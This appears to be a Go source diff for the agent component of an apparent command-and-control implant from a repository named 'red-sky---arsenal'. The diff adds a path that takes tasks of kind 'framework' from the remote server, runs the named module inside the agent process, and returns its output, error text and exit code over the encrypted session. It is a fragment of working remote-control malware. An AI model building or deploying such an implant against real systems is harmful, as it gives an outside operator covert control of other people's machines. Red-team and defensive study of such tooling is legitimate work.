@@ -6,6 +6,7 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
@@ -22,6 +23,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/sk666G/red-sky---arsenal/internal/agentfw"
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
@@ -170,8 +172,13 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 			if err := json.Unmarshal(env.Payload, &task); err != nil {
 				continue
 			}
-			log.Printf("task %s: %s %v", task.ID, task.Cmd, task.Args)
-			result := runTask(task)
+			log.Printf("task %s kind=%s: %s %v", task.ID, task.Kind, task.Cmd, task.Args)
+			var result proto.Result
+			if task.Kind == "framework" {
+				result = runFrameworkTask(task)
+			} else {
+				result = runTask(task)
+			}
 			if err := send(proto.TypeResult, result); err != nil {
 				return fmt.Errorf("send result: %w", err)
 			}
@@ -253,4 +260,23 @@ func sendEncrypted(conn net.Conn, sess *crypto.Session, t proto.MessageType, pay
 		return err
 	}
 	return wire.WriteFrame(conn, wire.FlagEncrypted, enc)
+}
+
+
+// runFrameworkTask handles a Task with Kind="framework" by dispatching to
+// agentfw, which runs the module natively in the agent process.
+func runFrameworkTask(t proto.Task) proto.Result {
+	ctx := context.Background()
+	if t.Timeout > 0 {
+		var cancel context.CancelFunc
+		ctx, cancel = context.WithTimeout(ctx, time.Duration(t.Timeout)*time.Second)
+		defer cancel()
+	}
+	r := agentfw.Dispatch(ctx, t.Cmd, t.Args)
+	return proto.Result{
+		TaskID:   t.ID,
+		Stdout:   r.Output,
+		Stderr:   func() string { if r.Err != nil { return r.Err.Error() }; return "" }(),
+		ExitCode: r.ExitCode,
+	}
 }
